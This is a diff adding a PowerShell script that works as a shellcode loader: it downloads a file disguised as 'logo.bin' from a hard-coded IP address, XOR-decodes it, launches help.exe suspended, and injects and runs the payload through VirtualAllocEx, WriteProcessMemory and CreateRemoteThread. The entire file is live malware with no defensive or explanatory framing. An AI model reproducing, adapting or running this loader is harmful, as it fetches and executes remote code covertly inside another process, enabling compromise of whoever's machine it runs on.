@@ -1,0 +1,73 @@
+﻿Add-Type -TypeDefinition @"
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+[StructLayout(LayoutKind.Sequential)]
+public struct PROCESS_INFORMATION
+{
+    public IntPtr hP;
+    public IntPtr ht;
+    public uint dwProcessId;
+    public uint dwThreadId;
+}
+[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+public struct STARTUPINFO
+{
+    public uint cb;
+    public string lpReserved;
+    public string lpDesktop;
+    public string lpTitle;
+    public uint dwX;
+    public uint dwY;
+    public uint dwXSize;
+    public uint dwYSize;
+    public uint dwXCountChars;
+    public uint dwYCountChars;
+    public uint dwFillAttribute;
+    public uint dwFlags;
+    public uint wShowWindow;
+    public short cbReserved2;
+    public IntPtr lpReserved2;
+    public IntPtr hStdInput;
+    public IntPtr hStdOutput;
+    public IntPtr hStdError;
+}
+public static class Kernel32
+{
+    [DllImport("kernel32.dll")]
+    public static extern bool CreateProcess(string a,string b,uint c,uint d,bool e,uint f,IntPtr g,string h, ref STARTUPINFO i,out PROCESS_INFORMATION j);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GlobalAlloc(uint a,uint b);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr VirtualAllocEx(IntPtr a,IntPtr b, uint c,uint d, uint  e);
+    [DllImport("kernel32.dll")]
+    public static extern bool WriteProcessMemory(IntPtr a,IntPtr b,IntPtr c,uint  d,IntPtr e);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr WaitForSingleObject(IntPtr a,uint b);
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr CreateRemoteThread(IntPtr a,IntPtr b,uint c,IntPtr d,IntPtr e,uint f,IntPtr g);
+}
+"@
+
+$webClient = New-Object System.Net.WebClient
+$url = "http://45.83.140.12/pot/jack/logo.bin"
+
+$shellbuf = $webClient.DownloadData($url)
+$shellsize = $shellbuf.Length
+for ($i = 1; $i -lt $shellsize; $i++) {
+    $shellbuf[$i] = $shellbuf[$i] -bxor $shellbuf[0]
+}
+
+$si = New-Object STARTUPINFO;
+$pi = New-Object PROCESS_INFORMATION;
+$addr = [Kernel32]::GlobalAlloc(0x40, $shellsize + 100);
+for ($i = 1;$i -lt $shellsize;$i++){
+	[System.Runtime.InteropServices.Marshal]::WriteByte($addr, $i - 1, $shellbuf[$i]);
+}
+[Kernel32]::CreateProcess("c:\windows\SysWOW64\help.exe",0,0,0,0,0x04,0,"c:",[ref] $si,[ref] $pi);
+$kZZZZ=$pi.hP;
+$mZZZZ=[Kernel32]::VirtualAllocEx($kZZZZ,0,$shellsize + 100,0x1000,0x40);
+[Kernel32]::WriteProcessMemory($kZZZZ,$mZZZZ,$addr, $shellsize, 0);
+$lZZZZ = [Kernel32]::CreateRemoteThread($kZZZZ, 0, 0, $mZZZZ, 0, 0, 0);
+[Kernel32]::WaitForSingleObject($lZZZZ, 500*1000);
+
